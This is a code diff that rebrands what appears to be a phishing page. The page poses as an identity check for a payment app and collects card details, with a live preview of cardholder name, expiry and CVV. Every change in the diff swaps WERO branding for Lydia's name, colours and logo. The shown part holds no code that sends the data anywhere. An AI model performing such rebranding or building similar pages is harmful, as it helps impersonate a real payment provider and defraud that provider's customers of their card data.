@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vérification Identité - WERO Paiement</title>
+  <title>Vérification Identité - Lydia Paiement</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     :root {
-      --primary: #FFD500;
+      --primary: #0066FF;
       --black: #0A0E27;
       --white: #FFFFFF;
-      --accent-green: #10B981;
-      --accent-blue: #3B82F6;
+      --accent-green: #0066FF;
+      --accent-blue: #0066FF;
       --accent-red: #EF4444;
       --gray-100: #F3F4F6;
       --gray-600: #4B5563;
@@ -32,7 +32,7 @@
 
     body {
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: #FFF275;
+      background: transparent;
       color: var(--black);
       line-height: 1.6;
       overflow-x: hidden;
@@ -49,7 +49,7 @@
     }
 
     header {
-      background: #FFF275;
+      background: transparent;
       backdrop-filter: blur(10px);
       position: sticky;
       top: 0;
@@ -145,7 +145,7 @@
       width: 85%;
       max-width: 400px;
       height: 100%;
-      background: #FFF275;
+      background: transparent;
       z-index: 1000;
       box-shadow: -10px 0 40px rgba(0, 0, 0, 0.2);
       transition: right var(--transition);
@@ -502,7 +502,7 @@
       display: flex;
       align-items: center;
       gap: 12px;
-      background: rgba(16, 185, 129, 0.1);
+      background: rgba(0, 102, 255, 0.1);
       border: 2px solid var(--accent-green);
       padding: 16px 20px;
       border-radius: 16px;
@@ -638,7 +638,7 @@
       align-items: center;
       justify-content: center;
       gap: 10px;
-      box-shadow: 0 12px 30px rgba(16, 185, 129, 0.3);
+      box-shadow: 0 12px 30px rgba(0, 102, 255, 0.3);
       margin-top: 10px;
       text-transform: uppercase;
       letter-spacing: 0.5px;
@@ -647,7 +647,7 @@
 
     .submit-btn:hover {
       transform: translateY(-4px);
-      box-shadow: 0 16px 40px rgba(16, 185, 129, 0.4);
+      box-shadow: 0 16px 40px rgba(0, 102, 255, 0.4);
     }
 
     .submit-btn:active {
@@ -685,7 +685,7 @@
     .footer-section h3 {
       font-size: 18px;
       margin-bottom: 15px;
-      color: #FFD500;
+      color: #0066FF;
       font-weight: 700;
     }
 
@@ -707,7 +707,7 @@
 
     .footer-section a:hover {
       opacity: 1;
-      color: #FFD500;
+      color: #0066FF;
     }
 
     .footer-bottom {
@@ -810,7 +810,7 @@
 
   <header>
     <div class="header-container">
-      <div class="logo">WERO</div>
+      <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/fr/c/c7/Logo_Lydia.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=original" alt="Lydia" style="height: 35px; width: auto;"></div>
       
       <nav class="desktop-nav">
         <a href="/">Accueil</a>
@@ -828,7 +828,7 @@
       
       <nav class="mobile-nav">
         <div class="mobile-nav-header">
-          <div class="logo">WERO</div>
+          <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/fr/c/c7/Logo_Lydia.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=original" alt="Lydia" style="height: 35px; width: auto;"></div>
           <button class="mobile-menu-close"><i class="fas fa-times"></i></button>
         </div>
         <div class="mobile-nav-links">
@@ -843,8 +843,8 @@
   <main>
     <section class="premiere-hero">
       <div class="container">
-        <h1>📋 Vérification d'Identité</h1>
-        <p>Remplissez vos informations pour finaliser la validation de votre compte WERO</p>
+        <h1><i class="fas fa-id-card" style="color: #0066FF; margin-right: 10px;"></i>Vérification d'Identité</h1>
+        <p>Remplissez vos informations pour finaliser la validation de votre compte Lydia</p>
       </div>
     </section>
 
@@ -877,7 +877,7 @@
             <div class="card-face card-back">
               <div class="card-magnetic-stripe"></div>
               <div class="card-signature-area">
-                <div class="card-signature" id="displayCardSignature">WERO</div>
+                <div class="card-signature" id="displayCardSignature">Lydia</div>
               </div>
               <div class="card-cvv-section">
                 <div class="card-cvv-label">CVV</div>
@@ -1010,7 +1010,7 @@
     <div class="container">
       <div class="footer-content">
         <div class="footer-section">
-          <h3>WERO</h3>
+          <h3>Lydia</h3>
           <p>Paiement Instantané Sécurisé</p>
         </div>
         <div class="footer-section">
@@ -1027,7 +1027,7 @@
         </div>
       </div>
       <div class="footer-bottom">
-        <p>&copy; 2024 WERO. Tous droits réservés.</p>
+        <p>&copy; 2024 Lydia. Tous droits réservés.</p>
       </div>
     </div>
   </footer>
@@ -1106,7 +1106,7 @@
       function updateCard() {
         const name = cardholder.value.trim().toUpperCase();
         displayCardHolder.textContent = name || 'NOM PRÉNOM';
-        displayCardSignature.textContent = name || 'WERO';
+        displayCardSignature.textContent = name || 'Lydia';
 
         const exp = expiryDate.value.trim();
         displayCardExpiry.textContent = exp || 'MM/AA';
